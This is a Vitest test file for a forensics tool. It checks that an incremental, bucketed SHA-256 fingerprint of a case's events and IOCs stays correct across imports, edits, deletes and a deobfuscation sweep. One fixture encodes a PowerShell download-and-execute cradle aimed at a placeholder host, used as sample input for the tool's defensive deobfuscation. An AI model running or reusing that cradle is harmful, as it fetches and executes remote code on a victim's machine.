import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { createHash } from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { emptyState, type ForensicEvent, type InvestigationState } from "../../src/analysis/stateTypes.js";
import { canonicalize } from "../../src/analysis/analysisRunHash.js";
import {
  investigationFingerprintOfCase,
  investigationOutput,
  STATE_HASH_ID,
} from "../../src/analysis/analysisRunSnapshot.js";
import { itemDigest, refreshRowFacts, rowFactsStamp } from "../../src/analysis/rowFacts.js";
import { deltaSchema, type AnalysisDelta } from "../../src/analysis/responseSchema.js";
import { mergeDelta, type WindowContext } from "../../src/analysis/stateMerge.js";
import { mergeIntoCase } from "../../src/analysis/caseMerge.js";
import { deobfuscateRows } from "../../src/composition/deobfuscationRows.js";
import { scriptBlockSignal } from "../../src/analysis/tradecraftRules.js";
import { caseSqliteWorker } from "../../src/analysis/caseSqliteWorker.js";
import { loadDatabaseSync } from "../../src/analysis/sqliteRuntime.js";

// #1887: the run record's case fingerprint, investigation-state/v3. Events and IOCs are hashed per
// bucket (the first four hex characters of each item's digest), and the case database keeps each
// bucket's hash, re-hashing only the buckets a write touched. The kept hashes must always give what
// hashing the loaded case gives, whatever wrote to the case.

function ev(id: string, description: string, p: Partial<ForensicEvent> = {}): ForensicEvent {
  return {
    id,
    timestamp: `2026-01-0${1 + (Number(id.replace(/\D/g, "")) % 9)}T00:00:00Z`,
    description,
    severity: "Medium",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    ...p,
  };
}

const psEnc = (plaintext: string): string =>
  `powershell.exe -NoProfile -enc ${Buffer.from(plaintext, "utf16le").toString("base64")}`;

const hex = (text: string): string => createHash("sha256").update(text).digest("hex");

let dir: string;
let store: StateStore;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "dfir-fpv3-"));
  const cases = new CaseStore(dir);
  await cases.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  store = new StateStore(cases);
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

const seeded = (): InvestigationState => ({
  ...emptyState("c1"),
  findings: [{ id: "f1", title: "t", severity: "High", description: "d", relatedEventIds: ["e2"] } as never],
  iocs: [
    { id: "i001", type: "ip", value: "203.0.113.9" } as never,
    { id: "i002", type: "domain", value: "a.example.com" } as never,
  ],
  forensicTimeline: Array.from({ length: 30 }, (_, i) => ev(`e${i}`, `row ${i}`, { asset: "H1" })),
});

/** The v3 hash written out from its definition, from a loaded case. */
function v3Reference(state: InvestigationState): string {
  const buckets = (items: readonly unknown[]): [string, string][] => {
    const by = new Map<string, string[]>();
    for (const d of items.map((item) => hex(JSON.stringify(canonicalize(item))))) {
      by.set(d.slice(0, 4), [...(by.get(d.slice(0, 4)) ?? []), d]);
    }
    return [...by.keys()].sort().map((b) => [b, hex([...by.get(b)!].sort().join("\n"))]);
  };
  return hex(
    JSON.stringify(
      canonicalize({
        findings: state.findings,
        forensicTimeline: buckets(state.forensicTimeline),
        iocs: buckets(state.iocs),
      }),
    ),
  );
}

/** The incremental fingerprint equals the pure one of a load, and came from the kept buckets. */
async function expectFresh(caseId = "c1"): Promise<string> {
  const state = await store.load(caseId);
  const pure = investigationOutput(state).hashes[0].sha256;
  expect(pure).toBe(v3Reference(state));
  expect(await investigationFingerprintOfCase(store, caseId)).toEqual({
    sha256: pure,
    findings: state.findings,
  });
  // The op itself answered from its buckets (not the full-listing fallback): nothing is left dirty.
  const op = await store.factsFingerprintV3(caseId, rowFactsStamp());
  expect(op && op.needsFull).toBe(false);
  expect(dirtyBuckets(caseId)).toBe(0);
  return pure;
}

function withDb<T>(caseId: string, fn: (db: InstanceType<ReturnType<typeof loadDatabaseSync>>) => T): T {
  const db = new (loadDatabaseSync())(store.databasePath(caseId));
  try {
    return fn(db);
  } finally {
    db.close();
  }
}

const dirtyBuckets = (caseId: string): number =>
  Number(
    (
      withDb(caseId, (db) => db.prepare("SELECT count(*) AS n FROM fp_buckets WHERE hash IS NULL").get()) as {
        n: number;
      }
    ).n,
  );

let step = 0;
function importDelta(prefix: string, n: number): { d: AnalysisDelta; ctx: WindowContext } {
  step++;
  const d = deltaSchema.parse({
    findings: [],
    iocs: [{ id: `${prefix}i1`, type: "file", value: `C:\\Windows\\Temp\\${prefix}-0.exe` }],
    mitreTechniques: [],
    forensicEvents: Array.from({ length: n }, (_, i) => ({
      id: `${prefix}e${i + 1}`,
      timestamp: `2026-07-${String(1 + (i % 28)).padStart(2, "0")}T10:00:00.000Z`,
      description: `Service installed ${prefix}-${i}`,
      severity: "Medium",
      mitreTechniques: [],
      relatedFindingIds: [],
      asset: "HOST-1",
      sources: ["SIEM import"],
    })),
    threadsOpened: [],
    threadsClosed: [],
    timelineNote: `import of ${n} event(s)`,
    summary: "",
  });
  const ctx: WindowContext = {
    windowSequence: -1,
    timestamp: `2026-09-30T10:${String(step).padStart(2, "0")}:00.000Z`,
    sourceScreenshots: [`import-${step}.json`],
  };
  return { d, ctx };
}

describe("investigation-state/v3 (#1887)", () => {
  it("is the id the run record writes", () => {
    expect(STATE_HASH_ID).toBe("investigation-state/v3");
    expect(investigationOutput(seeded()).hashes[0]).toEqual({
      id: STATE_HASH_ID,
      sha256: v3Reference(seeded()),
    });
  });

  it("changes with one event's severity and with a duplicate event, not with the timeline's order", () => {
    const base = seeded();
    const h = (s: InvestigationState): string => investigationOutput(s).hashes[0].sha256;
    const graded = {
      ...base,
      forensicTimeline: base.forensicTimeline.map((e, i) =>
        i === 4 ? { ...e, severity: "High" as const } : e,
      ),
    };
    const duplicated = { ...base, forensicTimeline: [...base.forensicTimeline, base.forensicTimeline[3]] };
    const twice = {
      ...duplicated,
      forensicTimeline: [...duplicated.forensicTimeline, base.forensicTimeline[3]],
    };
    const reversed = { ...base, forensicTimeline: [...base.forensicTimeline].reverse() };
    expect(new Set([h(base), h(graded), h(duplicated), h(twice)]).size).toBe(4);
    expect(h(reversed)).toBe(h(base));
    // An IOC and an event with the same content are still told apart by the list they sit in.
    const moved = {
      ...base,
      iocs: [base.iocs[1]],
      forensicTimeline: [...base.forensicTimeline, base.iocs[0] as never],
    };
    expect(h(moved)).not.toBe(h(base));
  });

  it("gives the empty case's hash for a case with no state", async () => {
    const empty = investigationOutput(emptyState("c1")).hashes[0].sha256;
    expect(await investigationFingerprintOfCase(store, "c1")).toEqual({ sha256: empty, findings: [] });
  });

  it("keeps the database's bucket hashes equal to hashing the loaded case after every kind of write", async () => {
    await store.save(seeded());
    const hashes = [await expectFresh()];
    // An importer merge (the incremental path after the first one).
    for (const prefix of ["a", "b"]) {
      const { d, ctx } = importDelta(prefix, 25);
      await mergeIntoCase(store, "c1", d, ctx, (s) => mergeDelta(s, d, ctx));
      hashes.push(await expectFresh());
    }
    // An analyst edit and a severity change.
    const [r1, r2] = await store.forensicRowsById("c1", ["e3", "ae4"]);
    await store.updateForensicRows("c1", [
      { ...r1, event: { ...r1.event, description: "analyst note" } },
      { ...r2, event: { ...r2.event, severity: "Critical" } },
    ]);
    hashes.push(await expectFresh());
    // A delete.
    const gone = await store.forensicRowsById("c1", ["e5", "be2"]);
    await store.deleteForensicRows(
      "c1",
      gone.map((g) => g.rowId),
    );
    hashes.push(await expectFresh());
    // A full save with an edited event.
    const state = await store.load("c1");
    await store.save({
      ...state,
      forensicTimeline: state.forensicTimeline.map((e) =>
        e.id === "e7" ? { ...e, description: "rewritten" } : e,
      ),
    });
    hashes.push(await expectFresh());
    // An append, including two identical events.
    await store.appendForensicEvents("c1", [ev("e90", "appended"), ev("e91", "twin"), ev("e91", "twin")]);
    hashes.push(await expectFresh());
    // IOC additions and an IOC edit.
    const overview = await store.loadOverview("c1");
    await store.saveOverview({
      ...overview,
      iocs: [
        { ...overview.iocs[0], value: "203.0.113.10" },
        ...overview.iocs.slice(1),
        { id: "i900", type: "ip", value: "198.51.100.1" } as never,
      ],
    });
    hashes.push(await expectFresh());
    // The deobfuscation sweep writes rows and IOCs.
    await store.appendForensicEvents("c1", [
      ev("e92", psEnc("IEX (New-Object Net.WebClient).DownloadString('http://a.example.com/x')")),
    ]);
    await deobfuscateRows(store, "c1", { gradeDerived: scriptBlockSignal });
    hashes.push(await expectFresh());
    // Every step changed the case, so every hash differs.
    expect(new Set(hashes).size).toBe(hashes.length);
  });

  it("re-hashes every bucket after the row facts' stamp changes", async () => {
    await store.save(seeded());
    const before = await expectFresh();
    // Other code's facts: every row is dropped and queued; the next fingerprint recomputes them all.
    await store.factsPending("c1", "another-build", 10);
    expect(await store.factsFingerprintV3("c1", rowFactsStamp())).toEqual({ needsFull: true });
    expect(await expectFresh()).toBe(before);
  });

  it("seeds the buckets of a case that has row facts but no bucket hashes yet", async () => {
    await store.save(seeded());
    await refreshRowFacts(store, "c1");
    const before = await expectFresh();
    // A case from before v3: facts are there, fp_buckets is empty and unstamped. A wrong clean
    // bucket left behind must not survive the seed either.
    withDb("c1", (db) => {
      db.exec("DELETE FROM fp_buckets; DELETE FROM storage_meta WHERE key='fp_buckets';");
      db.exec("INSERT INTO fp_buckets(kind, bucket, hash) VALUES ('iocs', 'zzzz', 'stale')");
    });
    expect(await expectFresh()).toBe(before);
  });

  it("falls back to the full listing when a row's facts are unknown", async () => {
    await store.save(seeded());
    const before = await expectFresh();
    const [row] = await store.forensicRowsById("c1", ["e2"]);
    await store.updateForensicRows("c1", [{ ...row, event: { ...row.event, severity: "Low" } }]);
    expect(await store.factsFingerprintV3("c1", rowFactsStamp())).toEqual({ needsFull: true });
    expect(await expectFresh()).not.toBe(before);
  });
});

describe("the bucket triggers on row_facts (#1887)", () => {
  async function freshCase(): Promise<{ rowId: number; bucket: string }> {
    await store.save(seeded());
    await caseSqliteWorker.request({ op: "ensureDatabase", dbPath: store.databasePath("c1") });
    await expectFresh();
    const [row] = await store.forensicRowsById("c1", ["e1"]);
    const digest = itemDigest((await store.load("c1")).forensicTimeline.find((e) => e.id === "e1"));
    return { rowId: row.rowId, bucket: digest.slice(0, 4) };
  }

  const bucketRows = (bucket: string): { kind: string; hash: string | null }[] =>
    withDb("c1", (db) =>
      db.prepare("SELECT kind, hash FROM fp_buckets WHERE bucket=? ORDER BY kind").all(bucket),
    ) as { kind: string; hash: string | null }[];

  it("an INSERT OR REPLACE with another digest marks the old bucket dirty, for both kinds", async () => {
    const { rowId, bucket } = await freshCase();
    const other = bucket === "ffff" ? "0000" : "ffff";
    withDb("c1", (db) =>
      db
        .prepare("INSERT OR REPLACE INTO row_facts(row_id, id, digest) VALUES (?, 'e1', ?)")
        .run(rowId, other + "0".repeat(60)),
    );
    expect(bucketRows(bucket)).toEqual([
      { kind: "forensicTimeline", hash: null },
      { kind: "iocs", hash: null },
    ]);
    expect(bucketRows(other)).toEqual([
      { kind: "forensicTimeline", hash: null },
      { kind: "iocs", hash: null },
    ]);
  });

  it("a cascade delete of the entity fires the row_facts delete trigger", async () => {
    const { rowId, bucket } = await freshCase();
    withDb("c1", (db) => {
      db.exec("PRAGMA foreign_keys=ON");
      db.prepare("DELETE FROM entities WHERE row_id=?").run(rowId);
      expect(db.prepare("SELECT count(*) AS n FROM row_facts WHERE row_id=?").get(rowId)).toEqual({ n: 0 });
    });
    expect(bucketRows(bucket).map((r) => r.hash)).toEqual([null, null]);
  });

  it("an update of a digest marks the old and the new bucket dirty", async () => {
    const { rowId, bucket } = await freshCase();
    const other = bucket === "aaaa" ? "bbbb" : "aaaa";
    withDb("c1", (db) =>
      db.prepare("UPDATE row_facts SET digest=? WHERE row_id=?").run(other + "0".repeat(60), rowId),
    );
    expect(bucketRows(bucket).map((r) => r.hash)).toEqual([null, null]);
    expect(bucketRows(other).map((r) => r.hash)).toEqual([null, null]);
  });
});
